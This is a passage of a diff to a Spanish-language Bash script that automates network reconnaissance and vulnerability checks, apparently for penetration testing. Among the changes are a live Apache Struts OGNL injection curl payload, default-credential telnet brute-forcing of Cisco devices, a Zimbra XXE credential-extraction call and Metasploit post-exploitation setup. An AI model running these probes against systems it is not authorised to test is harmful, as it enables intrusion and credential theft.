+					sleep 2
+					echo -e "\t[+] Revisando backups de archivos de configuración ($ip - IIS)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m backupIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt 
 									
 				fi
 									
@@ -2319,16 +2359,21 @@ then
 					curl --insecure --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "https://$ip:$port/" > logs/vulnerabilidades/$ip-$port-apacheStruts.txt 2>/dev/null
 					cp logs/vulnerabilidades/$ip-$port-apacheStruts.txt .vulnerabilidades/$ip-$port-apacheStruts.txt 
 					
-					echo -e "\t[+] Revisando directorios y archivos comunes (tomcat)"						
-					web-buster.pl -t $ip -p $port -h 5 -d / -m tomcat -s 1 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &			
-					web-buster.pl -t $ip -p $port -h 5 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &										
+					echo -e "\t[+] Revisando directorios  ($ip - tomcat)"	
+					web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt  &
+					sleep 2
+					echo -e "\t[+] Revisando archivos comunes de tomcat  ($ip - tomcat)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m tomcat -s 1 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$ip-$port-webarchivos.txt 
+					sleep 2
+					echo -e "\t[+] Revisando archivos comunes de servidor  ($ip - tomcat)"
+					web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$ip-$port-webarchivos.txt
 					sleep 1						
 				fi									
 				####################################	
 				break
 			else
 				perl_instancias=`ps aux | grep perl | wc -l`
-				echo -e "\t[-] Poca RAM ($free_ram Mb). Maximo número de instancias de nmap ($perl_instancias) "
+				echo -e "\t[-] Poca RAM ($free_ram Mb) ó maximo número de instancias de perl ($perl_instancias) "
 				sleep 3
 			fi
     	done	# done true					
@@ -2350,6 +2395,88 @@ then
 	#insert clean data	
 	insert_data   		
 fi
+
+cd webClone
+	echo -e "\t\t[+] Extrayendo URLs"
+	grep --color=never -irao "http://[^ ]*"  * | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt
+	lines=`wc -l http.txt  | cut -d " " -f1`
+	perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
+	paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/$DOMAIN-web-wget2.txt
+	rm http.txt 2>/dev/null
+				
+	grep --color=never -irao "https://[^ ]*"  * | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt
+	lines=`wc -l https.txt  | cut -d " " -f1`
+	perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
+	paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/$DOMAIN-web-wget2.txt
+	rm https.txt 2>/dev/null
+				 
+	#grep --color=never -irao "http://[^ ]*"  * | egrep -av "fontawesome|adobe|w3\.org|fontello|sil.org|campivisivi|isiaurbino|scriptype|tht|mit-license|HttpRequest|http-equiv|css|png|angularjs|example|openstreet|zkysky|angular-leaflet|angular-formly|yahoo|spotify|twitch|instagram|facebook|live.com|chieffancypants|angular-ui" | tr -d '>' | sort | uniq >> ../enumeracion/$DOMAIN-web-wget2.txt
+	#grep --color=never -irao "https://[^ ]*"  * | egrep -av "fontawesome|adobe|w3\.org|fontello|sil.org|campivisivi|isiaurbino|scriptype|tht|mit-license|HttpRequest|http-equiv|css|png|angularjs|example|openstreet|zkysky|angular-leaflet|angular-formly|yahoo|spotify|twitch|instagram|facebook|live.com|chieffancypants|angular-ui" | tr -d '>' | sort | uniq >> ../enumeracion/$DOMAIN-web-wget2.txt
+					
+					
+	# buscar archivos sin extension
+	find . -type f ! \( -iname \*.pdf -o -iname \*.html -o -iname \*.htm -o -iname \*.doc -o -iname \*.docx -o -iname \*.xls -o -iname \*.ppt -o -iname \*.pptx -o -iname \*.xlsx -o -iname \*.js -o -iname \*.css -o -iname \*.orig \) > archivos-sin-extension.txt
+	contador=1
+	mkdir documentos_renombrados 2>/dev/null
+	for archivo in `cat archivos-sin-extension.txt`;
+	do 		
+		tipo_archivo=`file $archivo`
+		# tipos de archivos : https://docs.microsoft.com/en-us/previous-versions//cc179224(v=technet.10)
+		if [[ ${tipo_archivo} == *"PDF"*  ]];then 													
+			mv $archivo documentos_renombrados/$contador.pdf 
+		fi		
+	 
+		if [[ ${tipo_archivo} == *"Creating Application: Microsoft Word"*  ]];then 												
+			mv $archivo documentos_renombrados/$contador.doc 
+		fi		
+		
+		if [[ ${tipo_archivo} == *"Microsoft Word 2007"*  ]];then 												
+			mv $archivo documentos_renombrados/$contador.docx 
+		fi		
+	 
+		if [[ ${tipo_archivo} == *"Creating Application: Microsoft Excel"*  ]];then 				
+			mv $archivo documentos_renombrados/$contador.xls 
+		fi				 
+	 
+		if [[ ${tipo_archivo} == *"Office Excel 2007"*  ]];then 							
+			mv $archivo documentos_renombrados/$contador.xlsx 
+		fi
+	 		 
+		if [[ ${tipo_archivo} == *"Creating Application: Microsoft PowerPoint"*  ]];then 								
+			mv $archivo documentos_renombrados/$contador.ppt 
+		fi	
+	 		 
+		if [[ ${tipo_archivo} == *"Office PowerPoint 2007"*  ]];then 				
+			mv $archivo documentos_renombrados/$contador.pptx 
+		fi		
+	 
+		if [[ ${tipo_archivo} == *"RAR archive data"*  ]];then 						
+			mv $archivo documentos_renombrados/$contador.rar 
+		fi		
+		let "contador=contador+1"	 
+	done # fin revisar archivos sin extension
+						
+	######### buscar IPs privadas
+	echo -e "\t\t[+] Revisando si hay divulgación de IPs privadas"	
+	grep -ira "192.168." * >> ../.vulnerabilidades/$DOMAIN-web-IPinterna.txt
+	grep -ira "172.16." * >> ../.vulnerabilidades/$DOMAIN-web-IPinterna.txt						
+						
+	grep -ira "http://172." * >> ../.vulnerabilidades/$DOMAIN-web-IPinterna.txt
+	grep -ira "http://10." * >> ../.vulnerabilidades/$DOMAIN-web-IPinterna.txt
+	grep -ira "http://192." * >> ../.vulnerabilidades/$DOMAIN-web-IPinterna.txt
+
+	grep -ira "https://172." * >> ../.vulnerabilidades/$DOMAIN-web-IPinterna.txt
+	grep -ira "https://10." * >> ../.vulnerabilidades/$DOMAIN-web-IPinterna.txt
+	grep -ira "https://192." * >> ../.vulnerabilidades/$DOMAIN-web-IPinterna.txt
+	###############################	
+	######### buscar comentarios 
+	echo -e "\t\t[+] Revisando si hay comentarios html, JS"	
+	grep --color=never -ir '// ' * | egrep -v "http|https|header|footer|div|class" >> ../.enumeracion/$DOMAIN-web-comentario.txt
+	grep --color=never -r '<!-- ' * | egrep -v "header|footer|div|class" >> ../.enumeracion/$DOMAIN-web-comentario.txt
+	grep --color=never -r ' \-\->' * | egrep -v "header|footer|div|class" >> ../.enumeracion/$DOMAIN-web-comentario.txt
+	egrep -i "password|contrase|pin|firma|key" ../.enumeracion/$DOMAIN-web-comentario.txt > ../.vulnerabilidades/$DOMAIN-web-comentario.txt
+						
+cd ../	 # salir de webCLone
 
 #  Eliminar URLs repetidas (clonacion)
 echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"										
@@ -2449,33 +2576,89 @@ grep PROPFIND .enumeracion2/* 2>/dev/null| while read -r line ; do
     contenido=`echo $line | cut -d ':' -f2-4`    
     echo $contenido > $archivo_destino    
 done
-insert_data
 #################################
 
+########## revisando Listado de directorios activos ###
+#En directorios descubiertos
+grep "Listado directorio" .enumeracion2/* 2>/dev/null| while read -r line ; do
+	echo -e "[+] Listado de directorio detectado"		
+    archivo_origen=`echo $line | cut -d ':' -f1`
+    #echo "archivo_origen $archivo_origen"
+    archivo_destino=$archivo_origen       
+	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
+	archivo_destino=${archivo_destino/webarchivos/listadoDirectorio}   	
+    contenido=`echo $line | cut -d ':' -f2-4 | cut -d "(" -f1`    
+    #200 http://1.2.3.4:80/assets/
+    #echo "contenido $contenido"
+    echo $contenido > $archivo_destino        
+done
 
-########## extrayendo informacion de phpinfo ###
-for archivo in `ls logs/enumeracion/*-phpinfo.txt 2>/dev/null;`; do	
-	#archivo = logs/enumeracion/190.186.131.162-443-phpinfo.txt	
-	#archivo2 = 190.186.131.162-443-phpinfo.txt
+#En la raiz de los servidores
+grep -i "index of" .enumeracion2/* 2>/dev/null| while read -r line ; do
+	echo -e "[+] Listado de directorio detectado"		
+    archivo_origen=`echo $line | cut -d ':' -f1`
+    #echo "archivo_origen $archivo_origen"
+    archivo_destino=$archivo_origen       
+	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
+	archivo_destino=${archivo_destino/webData/listadoDirectorio}   	
+    contenido=`echo $line | cut -d ':' -f2-4 | cut -d "(" -f1`    
+    #200 http://1.2.3.4:80/assets/
+    #echo "contenido $contenido"
+    echo $contenido > $archivo_destino        
+done
+##############################################
+
+########## revisando backdoors ###
+grep "Backdoor" .enumeracion2/* 2>/dev/null| while read -r line ; do
+	echo -e "[+] Posible backdoor detectado"		
+    archivo_origen=`echo $line | cut -d ':' -f1`
+    #echo "archivo_origen $archivo_origen"
+    archivo_destino=$archivo_origen       
+	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
+	archivo_destino=${archivo_destino/webarchivos/Backdoor}   	
+    contenido=`echo $line | cut -d ':' -f2-4 | cut -d "(" -f1`    
+    #200 http://1.2.3.4:80/assets/
+    #echo "contenido $contenido"
+    echo $contenido > $archivo_destino        
+done
+#################################
+# insertar datos 
+insert_data
+
+
+
+########## extrayendo informacion de divulgacionInformacion ###
+for archivo in `ls logs/enumeracion/*-divulgacionInformacion.txt 2>/dev/null;`; do	
+	#archivo = logs/enumeracion/190.186.131.162-443-divulgacionInformacion.txt	
+	#archivo2 = 190.186.131.162-443-divulgacionInformacion.txt
 	archivo2=`echo $archivo | cut -f3 -d"/"`	
 	ip=`echo $archivo2 | cut -f1 -d"-"`
 	port=`echo $archivo2 | cut -f2 -d"-"`
-	
-	echo -e "[+] Extrayendo información de phpinfo ($ip:$port)"
-
+		
 	for url in `cat $archivo`; do	
-		phpinfo.pl -url "\"$url\"" >> logs/vulnerabilidades/$ip-$port-phpinfo.txt 2>/dev/null
-	done
-  
-	egrep -iq "No es un archivo PHPinfo" logs/vulnerabilidades/$ip-$port-phpinfo.txt
-	greprc=$?
-	if [[ $greprc -eq 0 ]] ; then			
-		echo -e "\t[i] No es un archivo phpinfo valido"				
-	else
-		echo "URL  $url" >> .vulnerabilidades/$ip-$port-phpinfo.txt
-		echo ""  >> .vulnerabilidades/$ip-$port-phpinfo.txt
-		cat logs/vulnerabilidades/$ip-$port-phpinfo.txt >> .vulnerabilidades/$ip-$port-phpinfo.txt
-	fi										
+		#echo "url $url"
+		#logs/vulnerabilidades/104.198.171.232-80-divulgacionInformacion.txt:
+	   #if [[ (${url} == *"linux"* || ${device} == *"Ubuntu"*  || ${device} == *"Linux"* ) && (${device} != *"linux host"* )]];then 
+		if [[ ${url} == *"error"* || ${url} == *"log"*  ]];then 			
+			echo -e  "$OKRED\t\t[i] Archivo de error o log detectado! $RESET"
+			echo $url >> .vulnerabilidades/$ip-$port-divulgacionInformacion.txt
+			echo "" >> .vulnerabilidades/$ip-$port-divulgacionInformacion.txt
+		else
+			echo -e "\t\t[+] Posible archivo PhpInfo ($url)" 
+			phpinfo.pl -url "\"$url\"" >> logs/vulnerabilidades/$ip-$port-divulgacionInformacion.txt 2>/dev/null	
+			
+			egrep -iq "No es un archivo PHPinfo" logs/vulnerabilidades/$ip-$port-divulgacionInformacion.txt
+			greprc=$?
+			if [[ $greprc -eq 1 ]] ; then													
+				echo -e  "$OKRED\t\t[i] Es un archivo phpinfo valido ! $RESET"
+				echo "URL  $url" >> .vulnerabilidades/$ip-$port-divulgacionInformacion.txt
+				echo ""  >> .vulnerabilidades/$ip-$port-divulgacionInformacion.txt
+				cat logs/vulnerabilidades/$ip-$port-divulgacionInformacion.txt >> .vulnerabilidades/$ip-$port-divulgacionInformacion.txt
+			else
+				echo -e "\t\t[i] No es un archivo phpinfo valido"
+			fi	#archivo phpinfo
+		fi	
+	done  								
 done
 insert_data
 #################################
@@ -2506,8 +2689,9 @@ then
 				echo -e "\t$OKGREEN[i] Es una impresora $RESET"
 			else							
 				echo -e "\t[+] Comprobando usuario anonymous"
-				ftp-anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt > logs/vulnerabilidades/$ip-21-anonymous.txt 2>/dev/null 
-				cp logs/vulnerabilidades/$ip-21-anonymous.txt .vulnerabilidades/$ip-21-anonymous.txt
+				echo "ftp-anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt" > logs/vulnerabilidades/$ip-21-anonymous.txt 2>/dev/null 
+				ftp-anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt >> logs/vulnerabilidades/$ip-21-anonymous.txt 2>/dev/null 
+				grep "Listado de directorio" logs/vulnerabilidades/$ip-21-anonymous.txt > .vulnerabilidades/$ip-21-anonymous.txt
 				sleep 5
 			fi
 		fi	
@@ -2596,7 +2780,7 @@ then
 			
 			#open resolver
 			echo -e "\t [+] Probando si es un servidor DNS openresolver"
-			dig ANY google.com @$ip +short | grep --color=never google > .vulnerabilidades/$ip-53-openresolver.txt 2>/dev/null &																
+			dig ANY google.com @$ip +short | grep --color=never google | grep -v "failed" > .vulnerabilidades/$ip-53-openresolver.txt 2>/dev/null &																
 		
 	done
 	
@@ -2641,7 +2825,7 @@ if [ -f .servicios/smtp.txt ]
 			ip=`echo $line | cut -f1 -d":"`
 			port=`echo $line | cut -f2 -d":"`					
 			echo -e "[+]  $ip:$port"
-			egrep -iq "User unknown" logs/vulnerabilidades/$ip-$port-vrfy.txt 
+			egrep -iq "User unknown" logs/vulnerabilidades/$ip-$port-vrfy.txt 2>/dev/null
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then							
 				grep --color=never "exists" logs/vulnerabilidades/$ip-$port-vrfyEnum.txt > .vulnerabilidades/$ip-$port-vrfyEnum.txt					
@@ -2707,57 +2891,57 @@ getBanners.pl -l .datos/total-host-vivos.txt -t .nmap/nmap-tcp.grep
 	grep --color=never -i admin *webarchivos.txt 2>/dev/null| grep --color=never http | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt
 	
 	#tomcat
-	grep --color=never -i "/manager/html" * 2>/dev/null| grep --color=never http | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt	
+	grep --color=never -i "/manager/html" * 2>/dev/null | grep -v "subdominios.txt"  | grep --color=never http | awk '{print $2}' | sort | uniq -i >> ../.servicios/admin-web.txt	
 		
 	
 	#fortinet
-	grep --color=never -i forti * 2>/dev/null | cut -d "-" -f1 >> ../.servicios/fortinet2.txt
+	grep --color=never -i forti * 2>/dev/null | grep -v "subdominios.txt"  | cut -d "-" -f1 >> ../.servicios/fortinet2.txt
 	sort ../.servicios/fortinet2.txt | uniq > ../.servicios/fortinet.txt
 	rm ../.servicios/fortinet2.txt
 	
 	#3com
-	grep --color=never -i 3com * 2>/dev/null | cut -d "-" -f1 >> ../.servicios/3com2.txt
+	grep --color=never -i 3com * 2>/dev/null | grep -v "subdominios.txt"  | cut -d "-" -f1 >> ../.servicios/3com2.txt
 	sort ../.servicios/3com2.txt | uniq > ../.servicios/3com.txt
 	rm ../.servicios/3com2.txt
 	
 	#d-link
-	grep --color=never -i d-link * 2>/dev/null | cut -d "-" -f1 >> ../.servicios/d-link2.txt
+	grep --color=never -i d-link * 2>/dev/null | grep -v "subdominios.txt"  | cut -d "-" -f1 >> ../.servicios/d-link2.txt
 	sort ../.servicios/d-link2.txt | uniq > ../.servicios/d-link.txt
 	rm ../.servicios/d-link2.txt
 
 	#linksys
-	grep --color=never -i linksys * 2>/dev/null | cut -d "-" -f1 >> ../.servicios/linksys2.txt
+	grep --color=never -i linksys * 2>/dev/null | grep -v "subdominios.txt"  | cut -d "-" -f1 >> ../.servicios/linksys2.txt
 	sort ../.servicios/linksys2.txt | uniq > ../.servicios/linksys.txt
 	rm ../.servicios/linksys2.txt
 		
 	
 	#Pentahoo	
 	# Pentaho User Console - Login~~~~ ~~~/pentaho~~~login~ Apache-Coyote/1.1
-	grep --color=never -i pentaho * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" > ../.servicios/pentaho.txt
+	grep --color=never -i pentaho * 2>/dev/null | grep -v "subdominios.txt"  | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" > ../.servicios/pentaho.txt
 	
 	#ubiquiti
-	grep --color=never -i ubiquiti * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/ubiquiti2.txt	
+	grep --color=never -i ubiquiti * 2>/dev/null | grep -v "subdominios.txt"  | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/ubiquiti2.txt	
 	sort ../.servicios/ubiquiti2.txt | uniq > ../.servicios/ubiquiti.txt ; rm ../.servicios/ubiquiti2.txt
 	
 	#pfsense
-	grep --color=never -i pfsense * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/pfsense.txt
+	grep --color=never -i pfsense * 2>/dev/null | grep -v "subdominios.txt"  | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/pfsense.txt
 	
 	#PRTG
-	grep --color=never -i PRTG * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/PRTG.txt
+	grep --color=never -i PRTG * 2>/dev/null | grep -v "subdominios.txt"  | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/PRTG.txt
 	
 	#ZKsoftware
-	grep --color=never -i ZK * 2>/dev/null | sort | cut -d "-" -f1 | uniq | tr "-" ":" >> ../.servicios/ZKSoftware.txt		
+	grep --color=never -i ZK * 2>/dev/null | grep -v "subdominios.txt" | sort | cut -d "-" -f1 | uniq | tr "-" ":" >> ../.servicios/ZKSoftware.txt		
 	
 	#ZTE
-	grep --color=never -i ZTE * 2>/dev/null | sort | cut -d "-" -f1 | uniq | tr "-" ":" >> ../.servicios/ZTE2.txt
+	grep --color=never -i ZTE * 2>/dev/null | grep -v "subdominios.txt"  | sort | cut -d "-" -f1 | uniq | tr "-" ":" >> ../.servicios/ZTE2.txt
 	sort ../.servicios/ZTE2.txt | uniq > ../.servicios/ZTE.txt ; rm ../.servicios/ZTE2.txt
 		
 	
 	#zimbra
-	grep --color=never -i zimbra * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/zimbra.txt		
+	grep --color=never -i zimbra * 2>/dev/null | grep -v "subdominios.txt" | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/zimbra.txt		
 	
 	#jboss
-	grep --color=never -i jboss * 2>/dev/null | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/jboss.txt
+	grep --color=never -i jboss * 2>/dev/null | grep -v "subdominios.txt" | sort | cut -d "-" -f1-2 | uniq | tr "-" ":" >> ../.servicios/jboss.txt
 	
 	#401
 	grep --color=never -i Unauthorized * 2>/dev/null| grep --color=never http | cut -d "-" -f1  > ../.servicios/web401-2.txt
@@ -2818,8 +3002,8 @@ then
 		ip=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"` 	
 		echo -e "[+] Escaneando $ip : $port"					
-		echo "zimbraXXE.py https://$ip:$port" > logs/vulnerabilidades/$ip-cisco-vuln.txt 2>/dev/null		
-		zimbraXXE.py https://$ip:$port  >> logs/vulnerabilidades/$ip-$port-zimbraXXE.txt 2>/dev/null		
+		echo "hackWeb.pl -t $ip -p $port -m zimbraXXE" > logs/vulnerabilidades/$ip-$port-zimbraXXE.txt 2>/dev/null		
+		hackWeb.pl -t $ip -p $port -m zimbraXXE  >> logs/vulnerabilidades/$ip-$port-zimbraXXE.txt 2>/dev/null		
 		grep -i "credenciales" logs/vulnerabilidades/$ip-$port-zimbraXXE.txt  > .vulnerabilidades/$ip-$port-zimbraXXE.txt 															
 		 echo ""
  	done <.servicios/zimbra.txt
@@ -2870,7 +3054,7 @@ then
 			medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/$ip-admin-cisco.txt 2>/dev/null			
 		fi					
 				
-		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-cisco.txt > .vulnerabilidades/$ip-admin-cisco.txt
+		grep --color=never SUCCESS logs/vulnerabilidades/$ip-admin-cisco.txt > .vulnerabilidades/$ip-admin-cisco.txt 2>/dev/null
 		echo ""													 		
  	done <.servicios/cisco.txt
 	#insert clean data	
@@ -3463,5 +3647,5 @@ echo "setg SESSION X" >> command-metasploit.txt
 echo "resource /usr/share/lanscanner/postExploiter/enum.rc" >> command-metasploit.txt
 
 echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
-grep -ira "timed out" * logs/enumeracion/* 2>/dev/null
-grep -ira "Can't connect" * logs/enumeracion/* 2>/dev/null
+grep -ira "timed out" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed"
+grep -ira "Can't connect" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed"
